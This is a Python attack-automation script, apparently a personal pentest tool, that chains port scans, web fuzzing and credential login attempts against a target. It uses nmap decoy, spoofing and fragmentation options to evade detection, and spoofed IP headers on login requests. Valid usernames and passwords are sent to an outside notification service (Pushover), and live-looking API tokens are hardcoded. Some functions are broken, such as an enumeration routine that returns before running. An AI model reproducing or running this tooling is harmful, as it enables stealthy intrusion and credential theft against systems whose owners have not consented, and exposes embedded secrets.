#!/home/blanco/.local/share/pipx/venvs/bane/bin/python
# -*- coding: utf-8 -*-
"""
Created on Sun Jul 28 18:56:47 2024

@author: blanco
"""

import os
import sys
import re
import string
import json
import random
import curses
import time
import asyncio
import aiofiles
from concurrent.futures import ThreadPoolExecutor
import csv
import httpx
import urllib3
from bs4 import BeautifulSoup
import base64
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import logging
import aiohttp
import aiodns
import ssl
import certifi
import signal
from urllib.parse import quote
import bane
from bane.scanners.vulnerabilities import XSS_Scanner, Backend_Technologies_Scanner, Path_Traversal_Scanner, SSRF_Scanner, SSTI_Scanner, File_Upload_Scanner, Mixed_Content_Scanner, RCE_Scanner
from bane.scanners.cms import Drupal_Scanner, Joomla_Scanner, Magento_Scanner, WordPress_Scanner
from bane.bruteforce import Admin_Panel_Finder, Files_Manager_Finder, Force_Browsing, HTTP_Auth_Bruteforce
from bane import JWT_Manager
import requests
import socket
import subprocess


proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# SSL context setup
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Pushover authentication details
PUSHOVER_USER_KEY = 'u6qoy72x32yvgdcbedhihk7vj59wgn'  # Replace with your Pushover User Key
PUSHOVER_API_TOKEN = 'aokbkm4rcgcnq6iavfmbj1qdgb7k74'  # Replace with your Pushover API Token
PUSHOVER_SOUNDS = {
    'scancomplete': 'ScanComplete',
    'scanning': 'Scanning',
    'hacked': 'Hacked',
    'dead': 'Dead'
}



def check_root():
    if os.geteuid() != 0:
        logging.info("This script must be run as root. Please rerun with 'sudo'.")
        # Set the effective user ID to 0 (root)
        os.setuid(0)

check_root()

# Setup logging to log to both console and file
def setup_logging():
    """Setup logging configuration to log to both console and file."""
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)

    log_file = 'WarMachine.log'

    # Check if handlers are already set up to prevent duplicate handlers
    if not logger.hasHandlers():
        # File handler
        file_handler = logging.FileHandler(log_file)
        file_handler.setLevel(logging.INFO)

        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)

        # Formatter for both handlers
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        file_handler.setFormatter(formatter)
        console_handler.setFormatter(formatter)

        # Adding both handlers to the logger
        logger.addHandler(file_handler)
        logger.addHandler(console_handler)

# Initialize logging setup
setup_logging()
# Send a notification via Pushover
async def send_pushover_notification(message, sound_key='hacked'):
    """Send a Pushover notification with the specified sound."""
    logging.debug(f"Preparing to send Pushover notification: {message}")
    async with aiohttp.ClientSession() as session:
        try:
            payload = {
                'token': PUSHOVER_API_TOKEN,
                'user': PUSHOVER_USER_KEY,
                'message': message,
                'sound': PUSHOVER_SOUNDS.get(sound_key, 'Hacked')
            }
            async with session.post('https://api.pushover.net/1/messages.json', data=payload) as response:
                response.raise_for_status()  # Raise an error if the request failed
                logging.info(f"Sent Pushover notification with {sound_key} sound.")
        except aiohttp.ClientError as e:
            logging.error(f"Failed to send Pushover notification: {e}")
            sys.exit(0)


# Generate a random public IP address for spoofing
async def generate_random_public_ip():
    while True:
        ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
        octets = ip.split('.')
        # Ensure the IP address is a valid public IP address
        if (1 <= int(octets[0]) <= 126 or 128 <= int(octets[0]) <= 191 or 192 <= int(octets[0]) <= 223):
            if not (ip.startswith("10.") or ip.startswith("192.168.") or (ip.startswith("172.") and 16 <= int(octets[1]) <= 31) or ip.startswith("127.") or ip == "0.0.0.0" or ip == "255.255.255.255"):
                logging.debug(f"Generated random public IP: {ip}")
                return ip


# Generate a random MAC address for spoofing
async def generate_random_mac():
    # Create a random MAC address using a specific range of values
    mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
    mac_address = ':'.join(map(lambda x: format(x, '02x'), mac))
    logging.debug(f"Generated random MAC address: {mac_address}")
    return mac_address

# Generate headers with spoofed IP and MAC address
async def get_spoofed_headers():
    spoofed_ip = await generate_random_public_ip()  # Generate a random public IP
    spoofed_mac = await generate_random_mac()  # Generate a random MAC address
    headers = {
        'X-Forwarded-For': spoofed_ip,  # Spoofed IP header to mimic a different client
        'Client-IP': spoofed_ip,        # Another spoofed IP header
        'X-MAC-Address': spoofed_mac,   # Custom header to simulate a MAC address
        'Content-Type': 'application/json'  # Set to JSON as we are sending JSON payloads
    }
    logging.info(f"Using spoofed IP: {spoofed_ip}, spoofed MAC: {spoofed_mac}")
    return headers

# Function to save valid credentials to a file
async def save_credentials_to_file(username, password, outputs):
    with open(f"{outputs}/attacks/valid_credentials.txt", "a") as file:
        file.write(f"Username: {username}, Password: {password}\n")
    logging.info(f"Credentials saved: Username={username}, Password={password}")
    await send_pushover_notification(f"save credentials to file {username}: {password}", sound_key='hacked')
    time.sleep(5)



# run_command with timeout support
async def run_command(command, output_queue=None, log_file=None, timeout=None):
    try:
        proc = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Add timeout support using asyncio.wait_for
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)

        # Handle stdout and stderr if needed
        if output_queue:
            await output_queue.put(f"Command: {command}\nOutput: {stdout.decode().strip()}\n")

        if log_file:
            async with aiofiles.open(log_file, 'a') as f:
                await f.write(stdout.decode() + '\n')

        return stdout.decode(), stderr.decode()

    except asyncio.TimeoutError:
        if output_queue:
            await output_queue.put(f"Command: {command} timed out")
        return "", "Command timed out"
    except Exception as e:
        if output_queue:
            await output_queue.put(f"Error running command {command}: {str(e)}")
        return "", str(e)

# Check if Tor is available for a given IP asynchronously
async def check_tor(ip):
    command = f"proxychains curl http://{ip}"
    output, error = await run_command(command, timeout=10)
    if "Failed to connect" in error:
        logging.info("Tor failed to connect.")
        return False
    logging.info("Tor Connected.")
    return True

# check_webproxy function
async def check_webproxy():
    command = "curl -I http://127.0.0.1:8080"
    output, error = await run_command(command, timeout=10)
    if "Failed to connect" in error:
        logging.info("Proxies failed to connect.")
        return False
    logging.info("Proxies Connected.")
    return True

async def fetch_content(session, url):
    try:
        async with session.get(url) as response:
            # Read and return the response text content
            return await response.text()
    except Exception as e:
        logging.debug(f"Failed to fetch {url}: {e}")
        return None




# Create a directory asynchronously if it doesn't exist
async def create_directory(path):
    if not os.path.exists(path):
        os.makedirs(path)
        logging.info(f"Directory '{path}' created successfully.")
    else:
        logging.info(f"Directory '{path}' already exists.")

# Function to prepare directories
async def prepare_directories(outputs, http_IP, IP, user, log_file):
    try:
        dirs = [
            f'{outputs}/scan/Nmap',
            f'{outputs}/cherry',
            f'{outputs}/recon',
            f'{outputs}/attacks',
            f'{outputs}/zap'
        ]

        # Create directories if they don't exist
        for directory in dirs:
            os.makedirs(directory, exist_ok=True)

        if http_IP:
            # Write IP to URL.log using Python file handling
            async with aiofiles.open(f'{outputs}/recon/URL.log', 'w') as file:
                await file.write(f"{http_IP}\n")
        else:
            # Write IP to URL.log using Python file handling
            async with aiofiles.open(f'{outputs}/recon/URL.log', 'w') as file:
                await file.write(f"{IP}\n")


        # Set proper ownership for the user
        chown_command = f'sudo chown -R {user}:{user} {outputs}/*'
        await run_command(chown_command, None, log_file=log_file)

    except Exception as e:
        logging.info(f"Error preparing directories: {e}")


def clean_url_log(file_path):
    try:
        # Check if the file exists
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"The file '{file_path}' does not exist.")

        # Read the file and store unique URLs
        with open(file_path, 'r') as file:
            lines = file.readlines()

        # Use a set to filter out duplicates and empty lines
        unique_urls = set()
        for line in lines:
            cleaned_line = line.strip()  # Remove leading and trailing whitespace
            if cleaned_line:  # Avoid empty lines
                # Remove trailing slash for comparison
                if cleaned_line.endswith('/'):
                    cleaned_line = cleaned_line[:-1]
                unique_urls.add(cleaned_line)

        # Write the cleaned data back to the file
        with open(file_path, 'w') as file:
            for url in sorted(unique_urls):
                file.write(url + '\n')

        logging.info(f"Successfully cleaned the file '{file_path}'.")
    except FileNotFoundError as fnf_error:
        logging.info(fnf_error)
    except Exception as e:
        logging.debug(f"An unexpected error occurred: {e}")


async def generate_random_string(length=10):
    """
    Generate a random string of specified length.
    The string contains uppercase letters, lowercase letters, and digits.

    :param length: Length of the random string to be generated (default is 10)
    :return: A randomly generated string
    """
    if not isinstance(length, int) or length <= 0:
        raise ValueError("Length must be a positive integer.")

    characters = string.ascii_letters + string.digits  # All letters (uppercase and lowercase) and digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def extract_urls(IP, input_file, output_file):
    try:
        # Read the JSON data from the input file
        with open(input_file, 'r') as infile:
            data = infile.read()
            json_data = json.loads(data)

        # Extract URLs from the 'results' section
        urls = []
        for result in json_data['results']:
            if 'url' in result and 'host' in result:
                # Construct the full URL using the same scheme as in the result
                full_url = result['url'].replace(IP, result['host'])
                urls.append(full_url)

        # Write the extracted URLs to the output file, one per line
        with open(output_file, 'a') as outfile:
            for url in urls:
                outfile.write(url + '\n')
        clean_url_log(output_file)

        logging.info(f"Successfully extracted {len(urls)} URLs to {output_file}")
    except json.JSONDecodeError as e:
        logging.info(f"Error decoding JSON: {e}")
    except FileNotFoundError as e:
        logging.info(f"File not found: {e}")
    except Exception as e:
        logging.info(f"Unexpected error: {e}")


async def read_file(file_path):
    async with aiofiles.open(file_path, "r") as file:
        content = await file.read()
    return content

async def send_request(client, url):
    try:
        response = await client.get(url, follow_redirects=True)
        return url, response.status_code
    except httpx.HTTPStatusError as e:
        return url, e.response.status_code
    except httpx.RequestError as e:
        logging.info(f"Error with URL {url}: {e}")
        return url, None

async def categorize_and_save(url_status_map, outputs):
    rstrings = await generate_random_string(12)
    files = {'200': [], '300': [], '400': [], '500': []}
    for url, status_code in url_status_map.items():
        if status_code:
            if 200 <= status_code < 300:
                files['200'].append(url)
            elif 300 <= status_code < 400:
                files['300'].append(url)
            elif 400 <= status_code < 500:
                files['400'].append(url)
            elif 500 <= status_code < 600:
                files['500'].append(url)
    for category, urls in files.items():
        if urls:
            async with aiofiles.open(f"{outputs}/recon/{category}_{rstrings}.txt", 'w') as file:
                for url in urls:
                    await file.write(f"{url}\n")

async def Processes_URLS(file_path, outputs):
    content = await read_file(file_path)
    urls = content.splitlines()
    url_status_map = {}

    async with httpx.AsyncClient() as client:
        tasks = [send_request(client, url) for url in urls]
        responses = await asyncio.gather(*tasks)

    for url, status_code in responses:
        if status_code:
            logging.info(f"URL: {url} returned status: {status_code}")
        url_status_map[url] = status_code

    await categorize_and_save(url_status_map, outputs)



# Function to read URLs from a file
async def read_urls_from_file(filepath):
    try:
        async with aiofiles.open(filepath, 'r') as file:
            return [line.strip() async for line in file]
    except Exception as e:
        logging.info(f"Error reading file {filepath}: {e}")
        return []


# Define an asyncio function to get IP from ping
async def get_ip_from_ping(domain):
    try:
        # Use regex to remove the port if present
        match = re.match(r"^(.*?):(\d+)$", domain)
        if match:
            ip_address = match.group(1)
        else:
            ip_address = domain

        # Run the ping command without the port
        ping_output = subprocess.check_output(["ping", "-c", "1", ip_address], universal_newlines=True)

        # Extract IP address from ping output
        ip_address_from_ping = re.search(r"\(([\d.]+)\)", ping_output).group(1)
        logging.info(f"Resolved IP from ping: {ip_address_from_ping}")
        return ip_address_from_ping

    except subprocess.CalledProcessError as e:
        logging.info(f"Ping command failed: {e}")
        return None


# Define an asyncio function to fetch subdomain size
async def fetch_subdomain_size(url, IP):
    domain = url.split("//")[-1].split("/")[0]

    try:
        socket.gethostbyname(domain)
    except socket.gaierror:
        logging.info(f"DNS resolution failed for {domain}.")
        fallback_ip = await get_ip_from_ping(IP)
        if fallback_ip:
            url = url.replace(domain, fallback_ip)
        else:
            logging.info("Failed to retrieve fallback IP via ping. Aborting.")
            return None

    try:
        headers = {"Host": domain}
        response = requests.get(url, headers=headers, allow_redirects=False)
        if response.status_code <= 400  and not response.status_code >= 500:
            content_size = len(response.content)
            logging.info(f"Size of {url}: {content_size} bytes")
            return content_size
        else:
            logging.info(f"Failed to retrieve {url}, Status Code: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        logging.info(f"Error fetching {url}: {e}")
        return None


async def enumeration_stage(http_IP, IP, dirlist, sublist, paralist, tor, ffuf2burp, URLLog, speed, outputs, output_queue, log_file, scheme):


    domains_found = set()
    # Add base HOST to the set of subdomains
    domains_found.add(http_IP)

    domains = list(domains_found)

    # Subdomain Enumeration Task
    async def subdomain_enum(http_IP, sublist, speed, outputs, output_queue, log_file):
        # Check if http_IP is an IP address (IPv4) with optional port
        ip_match = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})(:\d+)?$", IP)
        return None

        if ip_match:
            # Ensure each part of the IP is in the valid range (0-255)
            if all(0 <= int(part) <= 255 for part in ip_match.groups()[:4]):
                logging.info(f"No subdomain enumeration performed for IP address: {http_IP}")
                return None
            else:
                # Proceed with the rest of the function if it is not an IP
                sub_size = await fetch_subdomain_size(f"{scheme}://nonexistent1234.{IP}", IP)

                logging.info('Starting enumeration of subdomains.')
                subdomain_enum_command = f'sudo ffuf -w {sublist} -u {http_IP} -H "Host: FUZZ.{IP}" {speed} -fs {sub_size} -fl 1 -o {outputs} >> {log_file} 2>&1'
                logging.info(subdomain_enum_command)
                await run_command(subdomain_enum_command, output_queue=output_queue, log_file=log_file)
                logging.info('Sub Enum skipped')

                return None



    # Directory Enumeration Task
    async def directory_enum(domains, dirlist, speed, EnumDir, output_queue, log_file):
        dir_enum_tasks = []  # Initialize the task list here
        logging.info('Starting enumeration of directory.')

        dir_enum_command = f'sudo feroxbuster --url {domains} -w {dirlist} {speed} --silent -o {EnumDir} >> {URLLog} 2>&1'
        logging.info(dir_enum_command)
        # Append the directory enumeration task to the list
        dir_enum_task = run_command(dir_enum_command, output_queue=output_queue, log_file=log_file)
        dir_enum_tasks.append(dir_enum_task)

        # Run directory enumeration tasks concurrently
        await asyncio.gather(*dir_enum_tasks)
        clean_url_log(URLLog)
        return None


    # Parameter Enumeration Task
    async def parameter_enum(domains, paralist, speed, EnumPara, output_queue, log_file):
        para_enum_tasks = []
        logging.info('Starting enumeration of parameters.')
        
        param_size = await fetch_subdomain_size(f"{domains}/?nonexistent1234=test", IP)


        if param_size == None:
            param_size = '-fl 1'
        else:
            param_size =f'-fs {param_size}'



        logging.info(f'Checking parameters for {domains}.')
        # Construct the ffuf command with the custom response length filter and JSON output
        para_enum_command = f'sudo ffuf -u "{domains}/?FUZZ=test" -H "Host: {IP}" {speed} -fl 1 -w {paralist} -o {EnumPara} >> {log_file} 2>&1'
        logging.info(para_enum_command)
        # Run ffuf command asynchronously
        para_enum_task = run_command(para_enum_command, output_queue=output_queue, log_file=EnumPara)
        para_enum_tasks.append(para_enum_task)

        # Run parameter enumeration tasks concurrently
        await asyncio.gather(*para_enum_tasks)
        return None


    result = await generate_random_string(12)

    # Unique file for each domain's parameter enumeration
    EnumSub = f'{outputs}/recon/Sub_{result}.txt'
    # Run all enumeration tasks
    if await subdomain_enum(http_IP, sublist, speed, EnumSub, output_queue, log_file) is None:
        pass
    else:
        await subdomain_enum(http_IP, sublist, speed, EnumSub, output_queue, log_file)
        extract_urls(IP, EnumSub, URLLog)


    EnumDir = f'{outputs}/recon/{result}_feroxdir.txt'
    await directory_enum(http_IP, dirlist, speed, EnumDir, output_queue, log_file)


    # Unique file for each domain's parameter enumeration
    EnumPara = f'{outputs}/recon/inject_{result}.txt'
    await parameter_enum(http_IP, paralist, speed, EnumPara, output_queue, log_file)
    extract_urls(IP, EnumPara, URLLog)


    logging.info('Enumeration stage complete.')


def extract_and_log_ips(input_file, output_file):
    try:
        # Check if the input file exists
        logging.info(f"Checking if the input file '{input_file}' exists...")
        if not os.path.exists(input_file):
            # Raise an error if the input file does not exist
            raise FileNotFoundError(f"The specified file '{input_file}' does not exist.")

        # Regex pattern to match IP addresses and ports
        # The pattern matches four groups of 1-3 digits separated by dots, followed by a colon and 1-5 digits
        logging.info("Compiling regex pattern for IP and port extraction...")
        ip_port_pattern = re.compile(r'((?:\d{1,3}\.){3}\d{1,3}):(\d{1,5})')

        target_urls = []

        # Read the file and extract all matching IPs and Ports
        logging.info(f"Opening input file '{input_file}' for reading...")
        with open(input_file, 'r') as file:
            for line_number, line in enumerate(file, 1):
                # Find all matches in the current line
                logging.info(f"Processing line {line_number}: {line.strip()}")
                matches = ip_port_pattern.findall(line)
                for match in matches:
                    ip, port = match
                    # Append the formatted IP:Port to the target_urls list
                    formatted_url = f"{ip}:{port}"
                    logging.info(f"Found IP and port: {formatted_url}")
                    target_urls.append(formatted_url)

        # Write all formatted target URLs to the log file
        logging.info(f"Opening output file '{output_file}' for writing...")
        with open(output_file, 'w') as log_file:
            for url in target_urls:
                # Write each URL to the output file
                logging.info(f"Writing URL to log file: {url}")
                log_file.write(f"{url}\n")

        # Print a success message indicating how many URLs were logged
        logging.info(f"Successfully logged {len(target_urls)} URLs to '{output_file}'.")

    # Handle the case where the input file is not found
    except FileNotFoundError as fnf_error:
        logging.debug(fnf_error)
    # Handle any other unexpected exceptions
    except Exception as e:
        logging.debug(f"An unexpected error occurred: {e}")



# Function to initialize the details dictionary
def initialize_details(tor, webproxy, ffuf2burp, IP, http_IP):
    # Initialize a dictionary to store scan details
    details = {
        'tor': tor,  # Tor proxy details
        'webproxy': webproxy,  # Web proxy details
        'ffuf2burp': ffuf2burp,  # Ffuf to Burp details
        'IP': IP,  # Target IP address
        'open_ports': set(),  # Set to store open ports discovered during scanning
        'http_ports': set(),  # Set to store HTTP ports discovered during scanning
        'https_ports': set(),  # Set to store HTTPS ports discovered during scanning
        'freeciv_ports': set(),  # Set to track Freeciv service ports
        'domain_name': None,  # Domain name of the target (if available)
        'os_details': None,  # Operating system details of the target (if available)
        'services': set(),  # Set to store detected services (e.g., Apache, MySQL)
        'targets_string': http_IP  # String representation of target IPs for fingerprinting
    }
    logging.debug(f"Initialized details: {details}")  # Debug log for initialized details
    return details


# Extract details from command output using regular expressions
def extract_details(output):
    # Define regular expression patterns to extract relevant information from the command output
    patterns = {
        'open_ports': re.compile(r'(\d+)/tcp\s+open'),  # Pattern to find open ports in the output
        'http_ports': re.compile(r'(\d+)/tcp\s+open\s+http'),  # Pattern to find HTTP ports
        'https_ports': re.compile(r'(\d+)/tcp\s+open\s+https'),  # Pattern to find HTTPS ports
        'freeciv_ports': re.compile(r'(\d+)/tcp\s+open\s+freeciv'),  # Pattern to find Freeciv ports
        'domain': re.compile(r'Nmap scan report for ([a-zA-Z0-9.-]+\.[a-zA-Z]{2,6})'),  # Pattern to extract the domain name
        'os': re.compile(r'Service Info: OS: ([^;]+)'),  # Pattern to extract OS details from service information
        'os_guess': re.compile(r'Aggressive OS guesses: ([^\n]+)'),  # Pattern to extract aggressive OS guesses
        'freeciv': re.compile(r'freeciv'),  # Pattern to detect the presence of Freeciv service
        'apache': re.compile(r'Apache'),  # Pattern to detect Apache service
        'nginx': re.compile(r'nginx'),  # Pattern to detect Nginx service
        'sql': re.compile(r'MySQL|PostgreSQL|Microsoft SQL Server|Oracle Database')  # Pattern to detect SQL-related services
    }

    # Initialize a dictionary to store the extracted details
    details = {
        'open_ports': set(),
        'http_ports': set(),
        'https_ports': set(),
        'freeciv_ports': set(),  # Added freeciv_ports to store freeciv related ports
        'domain': None,  # Initialize domain as None until extracted
        'os': None,  # Initialize OS details as None until extracted
        'services': set()  # Initialize set to store detected services
    }

    # Iterate through the patterns and extract matches from the command output
    for key, pattern in patterns.items():
        matches = pattern.findall(output)  # Find all matches for the current pattern in the output
        logging.debug(f"Pattern '{key}' found matches: {matches}")  # Debug log for pattern matches
        if key == 'domain' and matches:
            details[key] = matches[0]  # Store the first domain match found in the output
        elif key == 'os' and matches:
            details[key] = matches[0]  # Store the OS details from the output
        elif key == 'os_guess' and matches:
            # Append OS guesses if available, otherwise initialize the OS details with the first guess
            if details['os']:
                details['os'] += f"; {matches[0]}"
            else:
                details['os'] = matches[0]
        elif key in ['apache', 'nginx', 'sql', 'freeciv'] and matches:
            # Add the matched services (e.g., Apache, Nginx) to the services set
            details['services'].update(matches)
        elif matches:
            # Update the set with the matched ports (open, HTTP, HTTPS, Freeciv)
            details[key].update(matches)

    # Debugging: Log extracted details for verification
    logging.info(f"Extracted details: {details}")

    return details


# Update fingerprint file
async def update_fingerprint(fingerprint_file, details):
    # Debug log before writing to fingerprint file to trace details
    logging.debug(f"Updating fingerprint file '{fingerprint_file}' with details: {details}")
    # Open the fingerprint file asynchronously for writing
    async with aiofiles.open(fingerprint_file, "w") as f:
        # Write the various details to the fingerprint file
        await f.write(f"Proxys: {details['tor']}, {details['webproxy']}, {details['ffuf2burp']} \n")  # Write proxy details
        await f.write(f"Domain: {details['domain_name']}\n")  # Write domain name if available
        await f.write(f"Domain to IP: {details['IP']}\n")  # Write IP address of the domain
        await f.write(f"All Open Ports: {list(details['open_ports'])}\n")  # Write all open ports
        await f.write(f"HTTP Ports: {list(details['http_ports'])}\n")  # Write HTTP ports
        await f.write(f"HTTPS Ports: {list(details['https_ports'])}\n")  # Write HTTPS ports
        await f.write(f"Targets: {details['targets_string']}\n")  # Write target string details
        await f.write(f"OS Details: {details['os_details']}\n")  # Write OS details if available
        await f.write(f"Services: {', '.join(details['services'])}\n")  # Write detected services
    logging.info(f"Fingerprint file '{fingerprint_file}' updated successfully.")  # Log success message


# Define the fingerprint_stage function BEFORE main
async def fingerprint_stage(IP, tor, webproxy, ffuf2burp, speed_option, outputs, details, output_queue, log_file):
    # Define fingerprint commands to run on the target system using different tools
    fingerprint_commands = [
        f"{tor} ping -c 2 {IP}",  # Ping command to check reachability
        f"{tor} sudo rustscan -t 1000 -b 1000 --ulimit 1000 -r 0-65535 -a {IP} | sudo tee rust.txt",  # Rustscan to quickly identify open ports
        f"{tor} sudo nmap -p- {speed_option} {webproxy} -A  {IP} -vvv -oA {outputs}/scan/Nmap/A",
        f"{tor} sudo nmap -p- {speed_option} {webproxy} -sC  {IP} -vvv -oA {outputs}/scan/Nmap/SC",  # Nmap scan with default scripts
        f"{tor} sudo nmap -p- {speed_option} {webproxy} -sV  {IP} -vvv -oA {outputs}/scan/Nmap/SV",  # Nmap scan for version detection of services
        f"{tor} sudo nmap -p- {speed_option} {webproxy}  -O {IP} -vvv -oA {outputs}/scan/Nmap/OS",  # Nmap scan for OS detection
        f"{tor} sudo nmap -p- {speed_option} {webproxy}  --script=vuln {IP} -vvv -oA {outputs}/scan/Nmap/vuln",  # Nmap vulnerability scan to identify potential weaknesses
        f"{tor} sudo nmap -f -D RND:10 --spoof-mac 00:11:22:33:44:55 -g 53 --mtu 16 --randomize-hosts {speed_option} {webproxy} -sS -vvv -O {IP} -oA {outputs}/scan/Nmap/OS",  # Nmap scan with spoofing and OS detection
        f"{tor} sudo nmap -f -D RND:10 --spoof-mac 00:11:22:33:44:55 -g 53 --mtu 16 --randomize-hosts {speed_option} {webproxy} -vvv --script=vuln {IP} -oA {outputs}/scan/Nmap/vuln",  # Nmap vulnerability scan with spoofing
        f"{tor} sudo nmap -sS -f -D RND:10 --spoof-mac 00:11:22:33:44:55 -g 53 --mtu 16 --randomize-hosts --badsum -Pn {speed_option} {webproxy} -vvv  {IP} -oA {outputs}/scan/Nmap/hush",  # Nmap stealth scan with bad checksum
        f"{tor} sudo nmap -p 1-65535 -f -D RND:10 --spoof-mac 00:11:22:33:44:55 -g 53 --mtu 16 --randomize-hosts {speed_option} {webproxy} -sA -vvv  {IP} -oA {outputs}/scan/Nmap/hushgen",  # Nmap ACK scan with spoofing
        f"{tor} sudo nmap -f -D RND:10 --spoof-mac 00:11:22:33:44:55 -g 53 --mtu 16 --randomize-hosts {speed_option} {webproxy} -sS -vvv -O {IP} -oA {outputs}/scan/Nmap/hushOS",  # Nmap stealth scan with OS detection
        f"{tor} sudo nmap -f -D RND:10 --spoof-mac 00:11:22:33:44:55 -g 53 --mtu 16 --randomize-hosts {speed_option} {webproxy} -vvv --script=vuln {IP} -oA {outputs}/scan/Nmap/hushvuln"  # Nmap vulnerability scan with spoofing
    ]

    # Run the fingerprint commands asynchronously
    logging.info(f"Starting fingerprint commands: {fingerprint_commands}")  # Debug log for fingerprint commands
    fingerprint_tasks = [run_command(command, output_queue=output_queue, log_file=log_file) for command in fingerprint_commands]
    results = await asyncio.gather(*fingerprint_tasks)  # Run all fingerprint tasks concurrently

    # Process the results of the fingerprint commands
    for output, error in results:
        if error:
            # Log any errors encountered during the scan
            await output_queue.put(f"Error: {error}")
            logging.error(f"Error encountered: {error}")  # Error log for command error
            continue
        # Log the output of each command
        await output_queue.put(f"Output: {output}")
        logging.debug(f"Command output: {output}")  # Debug log for command output
        # Extract details from the command output
        scan_details = extract_details(output)
        # Update the details dictionary with extracted information
        details['open_ports'].update(scan_details['open_ports'])
        details['http_ports'].update(scan_details['http_ports'])
        details['https_ports'].update(scan_details['https_ports'])
        details['freeciv_ports'].update(scan_details['freeciv_ports'])  # Update freeciv_ports from scan details
        if scan_details['domain']:
            details['domain_name'] = scan_details['domain']
        if scan_details['os']:
            details['os_details'] = scan_details['os']
        details['services'].update(scan_details['services'])

        # Log updated details for debugging
        logging.debug(f"Updated details after processing output: {details}")

        # Update fingerprint file after each scan
        targets = [f"{IP}:{port}" for port in details['open_ports']]  # Include freeciv_ports in target list
        details['targets_string'] = ", ".join(targets)  # Update the target string with new ports
        fingerprint_file = os.path.join(outputs, "fingerprint.txt")  # Path to the fingerprint file
        await update_fingerprint(fingerprint_file, details)  # Update the fingerprint file with the latest details


# Extract CSRF token from the login page
async def get_csrf_token(session, login_page_url):
    logging.info("(+) Fetching login page to extract CSRF token...")
    try:
        # Use aiohttp's session to fetch the login page
        async with session.get(login_page_url, ssl=ssl_context) as response:
            logging.debug(f"Login page response status: {response.status}")
            if response.status != 200:
                logging.error(f"(-) Failed to fetch login page, status code: {response.status}")
                return None

            # Parse the response to extract the CSRF token
            soup = BeautifulSoup(await response.text(), 'html.parser')

            csrf_token_input = soup.find('input', {'name': 'csrf'})  # Check for the CSRF token
            if not csrf_token_input:
                csrf_token_input = soup.find('input', {'name': '_csrf'})  # Check for alternative CSRF token name
            if csrf_token_input:
                csrf_token = csrf_token_input.get('value')
                logging.info(f"(+) CSRF token found: {csrf_token}")
                return csrf_token
            else:
                logging.error("(-) CSRF token not found in the login page!")
                return None
    except aiohttp.ClientError as e:
        logging.error(f"(-) Exception occurred while fetching login page: {e}")
        return None


#Define a helper function to fetch the JWT from session cookies
def extract_jwt_from_set_cookie(response):
    """Extract JWT from aiohttp response cookies."""
    if 'session' in response.cookies:
        cookie = response.cookies['session']
        logging.info(f"(+) JWT token retrieved: {cookie.value}")
        return cookie.value
    else:
        logging.error("(-) 'session' cookie not found in the response.")
        return None

# Login function to authenticate using provided credentials
async def login(login_url, username, password):
    logging.debug(f"Attempting to login with URL: {login_url}, Username: {username}")

     # Use aiohttp.ClientSession() to create a session with proxy support
    connector = aiohttp.TCPConnector(ssl=ssl_context)  # Use SocksConnector to handle SOCKS5 proxy
    #connector = ProxyConnector.from_url('http://127.0.0.1:8080')
    async with aiohttp.ClientSession(connector=connector) as session:
        csrf_token = await get_csrf_token(session, login_url)  # Fetch CSRF token


        if not csrf_token:
            logging.error(f"(-) Cannot proceed without CSRF token. From {login_url} Login aborted.")
            return None

        # Prepare login parameters
        login_params = {'csrf': csrf_token, 'username': username, 'password': password}

        try:
            # Use aiohttp's session to post the login data
            async with session.post(
                login_url,
                data=login_params,
                headers=await get_spoofed_headers(),
                proxy='http://127.0.0.1:8080',
                allow_redirects=False
            ) as response:
                logging.debug(f"Login response status: {response.status}")
                if response.status == 302:  # Successful login (HTTP 302 means redirect)
                    logging.info(f"(+) Login {username}:{password} is successful.")
                    jwt_token = extract_jwt_from_set_cookie(response)  # Extract JWT token from cookies
                    if jwt_token:
                        logging.info(f"(+) JWT token retrieved: {jwt_token}")
                        return username, password, jwt_token
                    else:
                        logging.error("(-) JWT not found in session cookies.")
                        return username, password
                else:
                    logging.error(f"(-) Login {username}:{password} not successful, Status Code: {response.status}")
                    return csrf_token
        except aiohttp.ClientError as e:
            logging.error(f"(-) Error during login attempt: {e}")
            return None
        except ssl.SSLError as e:
            logging.error(f"(-) SSL Error during login attempt: {e}")
            return None



# Generate RSA key pair for JWT signing
def generate_rsa_key_pair():
    logging.info("(+) Generating RSA key pair...")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    public_key = private_key.public_key()

    # Export the private key for signing
    private_key_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )

    # Extract the public key components for the JWK header
    public_numbers = public_key.public_numbers()
    e_b64 = base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
    n_b64 = base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')

    return private_key_pem, e_b64, n_b64




async def fetch_page_content(session, url, headers=None, cookies=None):
    """Fetch the content of a page and return its length."""
    async with session.get(url, headers=headers, cookies=cookies, ssl=False) as response:
        if response.status == 200:
            content = await response.text()
            return len(content), content
        else:
            logging.error(f"(-) Failed to fetch page at {url}, Status Code: {response.status}")
            return None, None

